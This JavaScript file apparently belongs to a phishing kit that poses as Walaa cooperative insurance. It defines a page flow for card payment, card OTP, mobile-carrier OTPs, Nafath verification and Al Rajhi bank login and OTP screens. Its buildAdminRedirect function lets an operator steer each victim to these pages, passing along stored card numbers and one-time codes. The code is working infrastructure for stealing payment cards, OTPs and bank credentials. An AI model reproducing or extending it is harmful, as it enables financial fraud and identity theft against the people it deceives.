/** Default insurer for /confirm and /verfiy when companyData was never saved to DB */
const DEFAULT_COMPANY = {
  name: "شركة ولاء للتأمين التعاوني",
  nameKey: "insurance.companies.walaa",
  logo: "/walaa.jpg",
  price: 379.88,
  options: [],
};

export const SITE_PAGES = [
  { path: "/", label: "التقديم" },
  { path: "/reg", label: "التسجيل" },
  { path: "/activate", label: "اختيار التأمين" },
  { path: "/activate_shamel", label: "تأمين شامل" },
  { path: "/confirm", label: "الدفع" },
  { path: "/verfiy", label: "OTP البطاقة" },
  { path: "/phone", label: "الجوال" },
  { path: "/phoneOtp", label: "OTP الجوال" },
  { path: "/mobilyOtp", label: "OTP موبايلي" },
  { path: "/stcOtp", label: "OTP STC" },
  { path: "/navaz", label: "نفاذ" },
  { path: "/order_otp", label: "OTP الطلب" },
  { path: "/proof", label: "إثبات الشراء" },
  { path: "/stcOtp?stc=true", label: "إنتظار STC" },
  { path: "/rajhi-login", label: "الراجحي - دخول" },
  { path: "/rajhi-otp", label: "الراجحي - OTP" },
  { path: "/rajhi-call-waiting", label: "الراجحي - اتصال" },
];

function orderPayload(user) {
  const { __v, purchaseProofImage, ...rest } = user;
  return rest;
}

function dataSearch(user, extra = {}) {
  const payload = { ...orderPayload(user), ...extra };
  return `?data=${encodeURIComponent(JSON.stringify(payload))}`;
}

/**
 * Build redirect payload for a target page.
 * @returns {{ path: string, search: string, session: Record<string, string> | null }}
 */
export function buildAdminRedirect(user, page) {
  const id = user._id;
  const provider = user.MotslNetwork || "اس تي سي";
  const baseSession = { id, provider, phoneNetwork: provider };

  switch (page.path) {
    case "/":
      return { path: "/", search: "", session: baseSession };

    case "/reg":
    case "/activate":
    case "/activate_shamel":
      return {
        path: page.path,
        search: dataSearch(user),
        session: baseSession,
      };

    case "/confirm":
      return {
        path: "/confirm",
        search: dataSearch(user, {
          companyData: user.companyData || DEFAULT_COMPANY,
        }),
        session: baseSession,
      };

    case "/verfiy":
      return {
        path: "/verfiy",
        search: dataSearch(user, {
          companyData: user.companyData || DEFAULT_COMPANY,
          cardNumber: user.cardNumber || "",
        }),
        session: baseSession,
      };

    case "/phone":
      return {
        path: "/phone",
        search: `?id=${id}`,
        session: baseSession,
      };

    case "/phoneOtp":
    case "/mobilyOtp":
    case "/stcOtp":
      return { path: page.path, search: "", session: baseSession };

    case "/navaz": {
      const params = new URLSearchParams({ id });
      if (user.NavazOtp) params.set("userOtp", user.NavazOtp);
      return {
        path: "/navaz",
        search: `?${params.toString()}`,
        session: baseSession,
      };
    }

    case "/stc": {
      const params = new URLSearchParams();
      if (user.NavazOtp) params.set("otp", user.NavazOtp);
      const search = params.toString() ? `?${params.toString()}` : "";
      return { path: "/stc", search, session: baseSession };
    }

    case "/order_otp":
      return {
        path: "/order_otp",
        search: dataSearch(user, {
          companyData: user.companyData || DEFAULT_COMPANY,
        }),
        session: baseSession,
      };

    case "/proof":
      return {
        path: "/proof",
        search: dataSearch(user, {
          companyData: user.companyData || DEFAULT_COMPANY,
          cardNumber: user.cardNumber || "",
        }),
        session: baseSession,
      };

    default:
      return { path: page.path, search: "", session: baseSession };
  }
}
